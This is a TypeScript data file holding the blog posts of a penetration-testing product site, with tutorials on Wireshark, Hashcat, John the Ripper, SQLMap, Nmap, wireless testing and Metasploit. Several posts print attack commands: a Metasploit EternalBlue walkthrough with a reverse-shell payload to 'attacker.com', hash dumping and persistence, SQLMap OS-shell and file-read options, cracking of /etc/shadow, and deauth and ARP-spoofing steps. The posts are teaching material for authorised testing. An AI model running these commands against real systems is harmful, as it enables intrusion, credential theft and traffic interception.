/**
 * Blog content — the single source of truth.
 *
 * This data used to exist in three places: here (inside the client component),
 * src/lib/blog-posts.ts, and again inside BlogSection.tsx. Three copies drifted
 * exactly as three copies do. In one sweep that produced: two posts sharing a
 * title, four posts with no metadata at all (so they rendered with the blog
 * index's title and shipped no schema), and every post overstating its read
 * time by between five and eighteen times.
 *
 * So the data lives here, once, with no "use client" and no JSX, and everything
 * else derives from it.
 */

export interface BlogPost {
  slug: string;
  title: string;
  category: string;
  date: string;
  author: string;
  excerpt: string;
  content: string;
  tags: string[];
}

/**
 * Minutes to read, computed from the post rather than asserted next to it.
 *
 * The hand-written numbers claimed 9 to 18 minutes for posts of 228 to 500
 * words — a "18 min read" label on roughly one minute of text. 225 words per
 * minute is the usual reading rate for technical prose; code blocks are
 * scanned rather than read, so they are counted at a third.
 */
export function estimateReadTime(content: string): number {
  const code = (content.match(/```[\s\S]*?```/g) || []).join(" ");
  const prose = content.replace(/```[\s\S]*?```/g, " ");
  const words = prose.split(/\s+/).filter(Boolean).length;
  const codeWords = code.split(/\s+/).filter(Boolean).length;
  return Math.max(1, Math.round((words + codeWords / 3) / 225));
}

export const BLOG_POSTS: Record<string, BlogPost> = {
  "mastering-wireshark": {
    slug: "mastering-wireshark",
    title: "Mastering Wireshark: Network Traffic Analysis Deep Dive",
    category: "Tools",
    date: "2026-01-15",
    author: "Semih Kilic",
    excerpt: "Advanced packet capture and analysis techniques — from protocol dissection to identifying malicious traffic patterns in real-time.",
    tags: ["wireshark", "network-analysis", "packet-capture", "traffic-analysis"],
    content: `
## Introduction

Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level. In this deep dive, we'll cover advanced techniques that go beyond basic packet capture.

## Setting Up Capture Filters

Before capturing traffic, it's crucial to set up proper capture filters to reduce noise:

\`\`\`
# Capture only HTTP/HTTPS traffic
tcp port 80 or tcp port 443

# Capture traffic from a specific subnet
net 192.168.1.0/24

# Capture DNS queries only
udp port 53
\`\`\`

## Display Filters for Forensic Analysis

Once you have captured data, display filters help you isolate relevant packets:

\`\`\`
# Find HTTP POST requests (potential data exfiltration)
http.request.method == "POST"

# Find DNS queries to suspicious TLDs
dns.qry.name contains ".xyz" or dns.qry.name contains ".top"

# Detect potential C2 beaconing (regular interval connections)
tcp.flags.syn == 1 && tcp.flags.ack == 0
\`\`\`

## Identifying Malicious Traffic Patterns

### 1. DNS Tunneling Detection
Look for unusually long DNS queries or high-frequency DNS requests to the same domain. DNS tunneling often uses TXT records with base64-encoded data.

### 2. Beaconing Analysis
C2 (Command and Control) traffic often shows regular intervals. Use the Statistics > Conversations feature to identify hosts with periodic connections.

### 3. Data Exfiltration Indicators
- Large outbound data transfers during off-hours
- Encrypted connections to non-standard ports
- HTTP POST requests with large payloads to unknown domains

## Protocol Dissection

Wireshark's protocol dissectors allow deep inspection of application-layer protocols. Custom dissectors can be written in Lua for proprietary protocols.

## TShark for Automated Analysis

For automated analysis pipelines, TShark (Wireshark's CLI) is invaluable:

\`\`\`bash
# Extract all HTTP URLs from a capture
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Count connections per source IP
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Export specific streams
tshark -r capture.pcap -Y "tcp.stream eq 5" -w stream5.pcap
\`\`\`

## Best Practices

1. **Always capture with proper authorization** — Unauthorized packet capture may violate laws
2. **Use ring buffers** for continuous monitoring to avoid disk space issues
3. **Encrypt your captures** as they may contain sensitive data
4. **Timestamp analysis** is crucial for incident response timelines
5. **Combine with other tools** like Zeek (Bro) for automated threat detection

## Conclusion

Mastering Wireshark requires practice and understanding of network protocols. Start with your own lab environment, analyze known-good traffic first, then gradually move to more complex scenarios. The key is understanding what "normal" looks like so you can identify anomalies.
    `,
  },
  "hashcat-vs-john": {
    slug: "hashcat-vs-john",
    title: "Hashcat vs John the Ripper: Password Cracking Compared",
    category: "Tools",
    date: "2026-01-12",
    author: "Semih Kilic",
    excerpt: "GPU-accelerated password recovery showdown. Benchmarks, rule-based attacks, and choosing the right tool for the job.",
    tags: ["hashcat", "john-the-ripper", "password-cracking", "GPU"],
    content: `
## Overview

Password cracking is an essential skill in penetration testing. Two tools dominate this space: **Hashcat** (GPU-focused) and **John the Ripper** (CPU-focused with GPU support). Let's compare them head-to-head.

## GPU vs CPU Performance

| Hash Type | Hashcat (RTX 4090) | John the Ripper (CPU) | Speed Ratio |
|-----------|--------------------|-----------------------|-------------|
| MD5 | 164 GH/s | 850 MH/s | 193x |
| SHA-256 | 22 GH/s | 320 MH/s | 69x |
| bcrypt | 184 kH/s | 45 kH/s | 4x |
| NTLM | 300 GH/s | 1.2 GH/s | 250x |

## Attack Modes

### Hashcat Attack Modes
- **Dictionary Attack** (-a 0): Straight wordlist attack
- **Combination Attack** (-a 1): Combine two wordlists
- **Brute-Force** (-a 3): Mask-based attack
- **Rule-Based** (-a 0 -r rules): Apply transformation rules
- **Hybrid** (-a 6, -a 7): Wordlist + mask combinations

### John the Ripper Modes
- **Single Crack**: Uses login names and GECOS info
- **Wordlist**: Dictionary with optional rules
- **Incremental**: Brute-force with character frequency optimization
- **External**: Custom cracking modes via C-like config

## When to Use Which

**Choose Hashcat when:**
- You have a powerful GPU
- Cracking large hash lists
- Need maximum speed for common hash types
- Working with modern hash algorithms

**Choose John the Ripper when:**
- Working with exotic/uncommon hash formats
- Need automatic hash detection
- Running on servers without GPUs
- Need incremental mode's smart brute-force

## Practical Example

\`\`\`bash
# Hashcat: Crack NTLM hashes with rockyou
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John: Crack shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=All /etc/shadow

# Hashcat: Mask attack for 8-char passwords
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?s
\`\`\`

## Conclusion

Both tools are essential in a penetration tester's arsenal. Use Hashcat for raw GPU power and John for versatility. Many professionals use both in their workflows.
    `,
  },
  "owasp-top-10-2026": {
    slug: "owasp-top-10-2026",
    title: "OWASP Top 10 in 2026: What's Changed",
    category: "Security",
    date: "2026-01-08",
    author: "Semih Kilic",
    excerpt: "An updated look at the most critical web application security risks and how to mitigate them with modern tools.",
    tags: ["OWASP", "web-security", "top-10", "application-security"],
    content: `
## The Evolving Threat Landscape

The OWASP Top 10 continues to evolve as web technologies advance. In 2026, several categories have shifted to reflect modern application architectures including microservices, serverless, and AI-integrated applications.

## Key Changes from 2021

### 1. AI/ML Security Risks (NEW)
With the proliferation of AI-powered applications, new attack vectors have emerged:
- **Prompt Injection** — Manipulating LLM inputs to bypass safety controls
- **Training Data Poisoning** — Compromising model training pipelines
- **Model Inversion** — Extracting sensitive training data from models

### 2. API Security Misconfigurations (Elevated)
APIs now account for over 80% of web traffic. Common issues include:
- Broken Object Level Authorization (BOLA)
- Excessive data exposure in API responses
- Missing rate limiting and resource quotas

### 3. Supply Chain Vulnerabilities (Elevated)
The software supply chain remains a critical attack surface:
- Dependency confusion attacks
- Compromised CI/CD pipelines
- Malicious package injection

## Mitigation Strategies

1. **Shift-Left Security**: Integrate security testing into CI/CD pipelines
2. **Zero Trust Architecture**: Never trust, always verify
3. **SBOM (Software Bill of Materials)**: Track all dependencies
4. **AI Security Testing**: Specialized tools for LLM applications
5. **API Gateway Security**: Centralized API protection

## Using CyberSec Pro for OWASP Testing

CyberSec Pro's automated scanning engine covers all OWASP Top 10 categories with tools like:
- **Nikto** for web server misconfiguration detection
- **SQLMap** for injection testing
- **OWASP ZAP** for comprehensive web app scanning
- **Nuclei** for template-based vulnerability detection

## Conclusion

Stay ahead of threats by continuously testing your applications against the latest OWASP guidelines. Automated tools combined with manual testing provide the best coverage.
    `,
  },
  "metasploit-zero-to-exploit": {
    slug: "metasploit-zero-to-exploit",
    title: "Getting Started with Metasploit: Architecture, Workflow and Meterpreter",
    category: "Tutorials",
    date: "2026-01-05",
    author: "Semih Kilic",
    excerpt: "Hands-on walkthrough of the Metasploit Framework — modules, payloads, encoders, and post-exploitation techniques.",
    tags: ["metasploit", "exploitation", "penetration-testing", "post-exploitation"],
    content: `
## Getting Started with Metasploit

The Metasploit Framework is the world's most used penetration testing software. This tutorial walks you through from installation to your first exploit.

## Architecture Overview

Metasploit's modular architecture consists of:
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code that runs after exploitation (shells, Meterpreter)
- **Auxiliaries**: Scanning, fuzzing, and information gathering modules
- **Post-Exploitation**: Modules for privilege escalation, persistence, pivoting
- **Encoders**: Obfuscation to evade detection

## Basic Workflow

\`\`\`bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(ms17_010_eternalblue) > show options

# Set target and payload
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50

# Execute
msf6 > exploit
\`\`\`

## Meterpreter Post-Exploitation

Once you have a Meterpreter session:

\`\`\`bash
# System information
meterpreter > sysinfo

# Dump password hashes
meterpreter > hashdump

# Screenshot
meterpreter > screenshot

# Privilege escalation
meterpreter > getsystem

# Persistence
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

# Pivoting
meterpreter > run autoroute -s 10.0.0.0/24
\`\`\`

## Important: Legal & Ethical Considerations

**Always ensure you have written authorization before testing.** Unauthorized access to computer systems is illegal. Use dedicated lab environments or authorized bug bounty programs.

## Conclusion

Metasploit is an incredibly powerful framework. Master it in a controlled lab environment before using it in production assessments.
    `,
  },
  "ci-cd-pentest-automation": {
    slug: "ci-cd-pentest-automation",
    title: "Automating Penetration Tests with CI/CD",
    category: "DevSecOps",
    date: "2026-01-03",
    author: "Semih Kilic",
    excerpt: "Integrate security testing into your development pipeline with CyberSec Pro's API and GitHub Actions.",
    tags: ["CI/CD", "automation", "DevSecOps", "GitHub-Actions"],
    content: `
## Why Automate Security Testing?

Manual penetration testing is thorough but slow. By integrating automated security scans into your CI/CD pipeline, you can:
- **Catch vulnerabilities early** in the development lifecycle
- **Reduce remediation costs** (fixing in dev is 10x cheaper than production)
- **Ensure continuous compliance** with security standards
- **Scale security testing** across multiple projects

## CyberSec Pro API Integration

\`\`\`yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger CyberSec Pro Scan
        run: |
          curl -X POST https://api.cyber-sec-pro.com/v1/scans \\
            -H "Authorization: Bearer \${{ secrets.CYBERSEC_API_KEY }}" \\
            -H "Content-Type: application/json" \\
            -d '{
              "target": "\${{ github.event.repository.homepage }}",
              "tool_id": "nikto",
              "options": {"tuning": "1234567890"}
            }'
\`\`\`

## Pipeline Architecture

1. **Pre-commit**: Secret scanning, dependency audit
2. **Build**: SAST (Static Analysis), container scanning
3. **Deploy (Staging)**: DAST (Dynamic Analysis) with CyberSec Pro
4. **Post-Deploy**: Continuous monitoring, vulnerability alerts

## Best Practices

- Never block deployments on informational findings
- Set severity thresholds (block on Critical/High only)
- Keep scan results in a centralized dashboard
- Automate ticket creation for new vulnerabilities
- Schedule weekly full scans in addition to pipeline scans

## Conclusion

DevSecOps is not optional — it's essential. Start small with automated dependency checks, then gradually add DAST and infrastructure scanning to your pipeline.
    `,
  },
  "wireless-security-assessment": {
    slug: "wireless-security-assessment",
    title: "Wireless Security Assessment Best Practices",
    category: "Wireless",
    date: "2025-12-15",
    author: "Semih Kilic",
    excerpt: "Comprehensive guide to testing Wi-Fi network security using aircrack-ng, wifite, and bettercap.",
    tags: ["wireless", "WiFi", "aircrack-ng", "wifite", "bettercap"],
    content: `
## Wireless Security Testing Methodology

Wireless networks present unique attack surfaces. This guide covers the essential tools and techniques for assessing Wi-Fi security.

## Essential Tools

### Aircrack-ng Suite
The foundational toolkit for wireless assessment:

\`\`\`bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake for specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (to capture handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
\`\`\`

### Wifite (Automated)
For rapid assessment of multiple networks:

\`\`\`bash
# Automated scan and attack
wifite --kill --no-reaver

# Target specific encryption
wifite --wpa --dict /path/to/wordlist.txt
\`\`\`

### Bettercap (MITM)
For man-in-the-middle testing:

\`\`\`bash
# Start bettercap
bettercap -iface wlan0

# ARP spoofing
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on

# DNS spoofing
> set dns.spoof.domains example.com
> dns.spoof on
\`\`\`

## Assessment Checklist

1. **Encryption Strength**: WPA3 > WPA2-AES > WPA2-TKIP > WEP (never use)
2. **SSID Security**: Disable SSID broadcast in sensitive environments
3. **Client Isolation**: Prevent lateral movement between wireless clients
4. **Rogue AP Detection**: Monitor for evil twin attacks
5. **802.1X/RADIUS**: Enterprise authentication for corporate networks

## Legal Warning

**Wireless testing must only be performed on networks you own or have explicit written permission to test.** Unauthorized wireless access is a criminal offense in most jurisdictions.

## Conclusion

Regular wireless security assessments are essential for any organization. Combine automated scanning with manual testing for comprehensive coverage.
    `,
  },

  "sqlmap-injection-guide": {
    slug: "sqlmap-injection-guide",
    title: "SQLMap: Automated SQL Injection Testing Guide",
    category: "Tools",
    date: "2026-03-10",
    author: "Semih Kilic",
    excerpt: "Complete guide to using SQLMap for automated SQL injection detection and exploitation.",
    tags: ["sqlmap", "sql-injection", "web-security", "penetration-testing"],
    content: `
## Introduction

SQLMap is the world's most popular open-source SQL injection tool. It automates detection and exploitation of SQL injection vulnerabilities.

## Basic Scanning

- **Basic test:** sqlmap -u "https://target.com/page?id=1"
- **POST data:** sqlmap -u "https://target.com/login" --data="user=admin&pass=123"
- **Specific param:** sqlmap -u "https://target.com/page?id=1" -p id

## Database Enumeration

- **List databases:** sqlmap -u URL --dbs
- **List tables:** sqlmap -u URL -D mydb --tables
- **Dump table:** sqlmap -u URL -D mydb -T users --dump
- **Dump all:** sqlmap -u URL --dump-all

## Advanced Techniques

### Bypass WAF/IPS

- Use tamper scripts: --tamper=space2comment,between
- Randomize user-agent: --random-agent
- Use cookies: --cookie="session=abc123"

### OS Shell Access

- Get interactive shell: --os-shell
- Read local files: --file-read="/etc/passwd"

## Best Practices

1. Always get authorization before testing
2. Start with less intrusive tests using --level=1 --risk=1
3. Use --batch for automated scanning
4. Save your session with --session for resume capability
5. Test in a lab first to understand the tool

## Conclusion

SQLMap is essential for web application security testing. Master its capabilities and always use it responsibly.
    `,
  },
  "nmap-network-scanning": {
    slug: "nmap-network-scanning",
    title: "Nmap: Complete Network Scanning & Discovery Guide",
    category: "Tools",
    date: "2026-02-28",
    author: "Semih Kilic",
    excerpt: "Why your scan found nothing, what the six port states actually mean, and the two-pass workflow that scales past one host. With real output from a host we control.",
    tags: ["nmap", "network-scanning", "port-scanning", "reconnaissance"],
    content: `
## What Nmap is actually telling you

Nmap sends packets and reports what came back. That sounds obvious, and it is the single most useful thing to keep in mind, because every line of output is an *inference* drawn from a response — or from the absence of one. A port marked \`open\` means a probe got an acknowledgement. A port marked \`filtered\` means nothing came back at all, and Nmap cannot tell you whether that is a firewall, a dropped packet, or a host that stopped answering because you scanned it too fast.

Most bad scan results come from forgetting this. The tool is not reading the target's configuration; it is guessing from the outside, and it will tell you how confident it is if you read carefully.

## Your first scan, and what the default quietly leaves out

\`\`\`
nmap scanme.nmap.org
\`\`\`

That scans **1,000 TCP ports**, not 65,535. They are the thousand ports Nmap's authors found most often open in a large internet survey, and they catch the overwhelming majority of real services. They also miss the interesting ones: an admin panel on 8443, a forgotten Redis on 6379, a debug listener someone left on 31337.

So the default is the right first scan and the wrong last one:

\`\`\`
# Every TCP port. Slower, and the one that finds the surprises.
nmap -p- target.example.com

# A middle ground — the 3,000 most common.
nmap --top-ports 3000 target.example.com

# Exactly what you care about.
nmap -p 22,80,443,8080,8443 target.example.com
\`\`\`

If you only ever run one command against a host you are responsible for, make it \`-p-\`. Every "we didn't know that was exposed" incident starts with a scan that stopped at 1,000.

## When a scan finds nothing: host discovery

Before touching a single port, Nmap decides whether the host is even up. On a local network that is an ARP request; across the internet it is a mix of ICMP echo, a TCP ACK to 80, a SYN to 443, and an ICMP timestamp request. If none of those come back, Nmap declares the host down and **never scans it**.

Plenty of production hosts drop all of it. That produces the most common false conclusion in network scanning: "the host is down", when it is serving traffic perfectly well.

\`\`\`
# Skip discovery. Treat the host as up and scan it regardless.
nmap -Pn target.example.com

# The opposite: discovery only, no port scan. A fast inventory sweep.
nmap -sn 10.0.0.0/24
\`\`\`

\`-sn\` over a /24 is the fastest honest answer to "what is actually on this network". Run it first, then scan what it finds.

## Choosing a scan type

\`\`\`
nmap -sS target    # SYN scan — needs root
nmap -sT target    # TCP connect — works unprivileged
nmap -sU target    # UDP — a different animal entirely
\`\`\`

**\`-sS\`** sends a SYN, waits for the SYN/ACK, and sends a RST instead of completing the handshake. It is the default *when you have privileges*, because it is faster and because the connection never completes, so many applications never log it. It needs raw sockets, which means root or \`CAP_NET_RAW\`.

**\`-sT\`** asks the operating system to open a real connection. It works without privileges and it is what Nmap silently falls back to if you forget \`sudo\`. The handshake completes, so the target's application logs see a connection from you. If you are scanning without privileges and wondering why the target noticed, this is why.

**\`-sU\`** is the one people skip, and skipping it is how DNS, SNMP, NTP and IKE stay invisible in reports. UDP has no handshake: a closed port answers with ICMP port-unreachable, an open port usually answers with nothing at all — which looks identical to a firewall drop. Nmap has to wait out a timeout on every non-responsive port, and Linux rate-limits the ICMP replies it depends on. A full UDP scan of 65,535 ports can genuinely take hours. Scope it:

\`\`\`
nmap -sU --top-ports 100 target.example.com
\`\`\`

## Six port states, not two

This is where most reports go wrong. Nmap has six states and people read only two of them.

| State | What it means |
|---|---|
| \`open\` | Something is listening and it answered |
| \`closed\` | The host answered and refused — the host is up, nothing is on that port |
| \`filtered\` | Nothing came back. A firewall is probably dropping your probe |
| \`unfiltered\` | Reachable, but Nmap cannot tell open from closed (ACK scans) |
| \`open\\|filtered\` | No answer, and for this scan type that is ambiguous (common on UDP) |
| \`closed\\|filtered\` | Ambiguity between closed and filtered (idle scans) |

\`closed\` and \`filtered\` are not synonyms, and the difference matters more than it looks. A host that returns \`closed\` for 999 ports and \`filtered\` for one is telling you that one port is being deliberately protected — which is usually the interesting one. A host that returns \`filtered\` for everything is behind a default-deny firewall and your scan is measuring the firewall, not the host.

## Version detection is a guess, with a confidence level

\`\`\`
nmap -sV target.example.com
nmap -sV --version-intensity 9 target.example.com   # try every probe
nmap -A target.example.com                          # -sV, -sC, -O and traceroute
\`\`\`

\`-sV\` connects and compares what the service says against a fingerprint database of thousands of signatures. When the service is chatty, the result is excellent. When it isn't, the result is thin — and thin is the correct answer, not a failure.

Here is a scan against a host we control, so we can compare the output to the configuration behind it:

\`\`\`
PORT     STATE  SERVICE       VERSION
80/tcp   open   http          nginx
3389/tcp open   ms-wbt-server Microsoft Terminal Service
\`\`\`

Nginx is reported with no version at all. That is not Nmap giving up — it is \`server_tokens off\` in the nginx configuration, which strips the version from the \`Server\` header. Nmap reported exactly as much as the service was willing to say. If you are on the defending side, that line is what a hardened banner is supposed to look like.

\`-A\` is the convenient bundle: version detection, the default script set, OS detection and a traceroute. It is also loud and slow. Use it when you have already decided a host is worth the attention, not as your opening move.

## NSE: the part that gets skipped

The Nmap Scripting Engine is where the tool stops being a port scanner. Roughly 600 scripts ship with it, grouped into categories.

\`\`\`
nmap -sC target                           # the "default" category
nmap --script vuln target                 # known-vulnerability checks
nmap --script ssl-enum-ciphers -p 443 t   # every cipher suite the TLS stack offers
nmap --script http-enum -p 80,443 target  # common paths and admin panels
nmap --script smb-os-discovery -p 445 t   # Windows host details over SMB
\`\`\`

Two categories deserve care. \`safe\` scripts do not crash services or use significant bandwidth. \`intrusive\` ones might — and \`vuln\` pulls in a number of them. \`--script vuln\` against a production box during business hours is a real way to cause an outage you will have to explain. Read what a script does before you point it at something you do not own:

\`\`\`
nmap --script-help ssl-enum-ciphers
\`\`\`

## Speed, and what you trade for it

\`\`\`
nmap -T4 target                    # a sensible default on a good network
nmap --min-rate 1000 target        # at least 1,000 packets per second
nmap -p- --min-rate 5000 target    # all 65,535 ports, fast, on a LAN
\`\`\`

\`-T0\` through \`-T5\` set timing templates. \`-T4\` is the usual choice; \`-T5\` is aggressive enough that on a congested link or through a rate-limiting firewall it will start **missing open ports** — Nmap gives up on a retransmit before the answer arrives. A fast scan that misses a service is worse than a slow one, because you will write "not exposed" in a report and be wrong.

\`--min-rate\` is the more honest control: it sets a packet rate floor rather than a vague aggression level, and it makes your scans reproducible. If you are scanning across the internet rather than a LAN, start lower and watch for a rising \`filtered\` count — that is the signal you are being rate-limited and your results are degrading.

## Output you can actually use later

\`\`\`
nmap -oA scan-2026-09-13 target.example.com
\`\`\`

\`-oA\` writes all three formats at once: \`.nmap\` (what you saw on screen), \`.gnmap\` (one line per host, for \`grep\` and \`awk\`), and \`.xml\`.

Take the XML seriously. It is the format every other tool reads — report generators, \`ndiff\`, and anything that wants structured findings. And with two scans you can diff them:

\`\`\`
ndiff monday.xml friday.xml
\`\`\`

That output — what opened, what closed, what changed version between two dates — is more useful to most organisations than any single scan. A port that appeared on Friday is an event. A port that was there both times is inventory.

## A workflow that scales past one host

For anything bigger than a single machine, scan in two passes.

\`\`\`
# 1. Who is alive?
nmap -sn 10.0.0.0/16 -oG alive.gnmap
grep "Status: Up" alive.gnmap | awk '{print $2}' > live-hosts.txt

# 2. What is on them? Fast and wide first.
nmap -iL live-hosts.txt -p- --min-rate 2000 -oA wide

# 3. Version and script detail, only on the ports you actually found.
nmap -iL live-hosts.txt -p 22,80,443,3306,8080 -sV -sC -oA deep
\`\`\`

The mistake is running \`-A -p-\` against a whole range in one go. It takes days, it is loud enough to generate tickets, and it produces one enormous file nobody reads. Wide-and-shallow, then narrow-and-deep, gets the same information in a fraction of the time.

## Before you scan anything

Port scanning a host you do not own or have written permission to test is unlawful in many jurisdictions, and "I was only looking" has not been a successful defence. Get authorisation in writing, keep the scope in the document, and stay inside it. \`scanme.nmap.org\` exists precisely so that people can practise legally — the Nmap project maintains it for that purpose, and asks that you not hammer it.

On your own infrastructure, none of this applies and you should be scanning it regularly. The asset you do not know about is the one that gets you.

## Running this without the local setup

Everything above runs on an Nmap install you maintain yourself, and that is a perfectly good way to work. If you would rather not maintain it, CyberSec Pro runs Nmap — with the flags above, on a generated form, with the command shown before it executes — from a browser, and streams the output as it arrives. The scan runs server-side in a dedicated container, one process per job, and the result is stored so you can diff it against the next one.

Either way, the thinking is the same: know what the states mean, scan the whole port range at least once, and never trust a scan that was faster than the network.
    `,
  },
  "metasploit-exploitation": {
    slug: "metasploit-exploitation",
    title: "Metasploit Modules, Payloads and the Exploitation Workflow",
    category: "Tools",
    date: "2026-02-15",
    author: "Semih Kilic",
    excerpt: "Complete walkthrough of Metasploit Framework — module types, exploit development, and post-exploitation.",
    tags: ["metasploit", "exploitation", "penetration-testing", "msfconsole"],
    content: `
## Introduction

Metasploit Framework is the world's most used penetration testing framework. It provides tools for every stage of a pentest.

## Getting Started

- **Start console:** msfconsole
- **Search exploits:** search type:exploit platform:windows smb
- **Use exploit:** use exploit/windows/smb/ms17_010_eternalblue
- **Show options:** show options
- **Set options:** set RHOSTS 192.168.1.100

## Module Types

### Exploits
- exploit/multi/handler — Generic listener
- exploit/windows/smb/ — Windows SMB exploits
- exploit/linux/http/ — Linux web exploits

### Payloads
- payload/windows/meterpreter/reverse_tcp — Windows
- payload/linux/x64/meterpreter/reverse_tcp — Linux
- payload/python/meterpreter/reverse_tcp — Cross-platform

## Exploitation Workflow

1. Find target: search type:exploit apache
2. Configure: set RHOSTS target.com
3. Set payload: set PAYLOAD linux/x64/meterpreter/reverse_tcp
4. Set listener: set LHOST attacker.com
5. Exploit: exploit

## Post-Exploitation

- **System info:** sysinfo, getuid
- **File ops:** download /etc/passwd, upload shell.sh
- **Network recon:** ifconfig, route, netstat
- **Privilege escalation:** getsystem

## Conclusion

Metasploit is powerful but must be used responsibly. Master the basics in a lab first.
    `,
  },
  "hashcat-password-cracking": {
    slug: "hashcat-password-cracking",
    title: "Hashcat: GPU-Accelerated Password Cracking Mastery",
    category: "Tools",
    date: "2026-01-28",
    author: "Semih Kilic",
    excerpt: "Advanced Hashcat techniques for password auditing — hash modes, rule-based attacks, and optimization.",
    tags: ["hashcat", "password-cracking", "hash-cracking", "security-audit"],
    content: `
## Introduction

Hashcat is the world's fastest password recovery utility. It supports GPU acceleration and over 300 hash types.

## Hash Modes

- **MD5:** -m 0
- **NTLM:** -m 1000
- **SHA-256:** -m 1400
- **sha512crypt:** -m 1800
- **bcrypt:** -m 3200

## Attack Modes

### Dictionary Attack
- **Basic:** hashcat -m 0 -a 0 hashes.txt wordlist.txt
- **With rules:** hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

### Mask Attack
- **Unknown chars:** hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
  - ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special

### Hybrid Attack
- **Word + mask:** hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
- **Mask + word:** hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt

## Optimization

- **GPU selection:** -d 1
- **Speed optimization:** -O
- **Session management:** --session=mysession
- **Restore session:** --session=mysession --restore

## Conclusion

Hashcat is essential for password security auditing. Use it to verify password policies.
    `,
  },
};
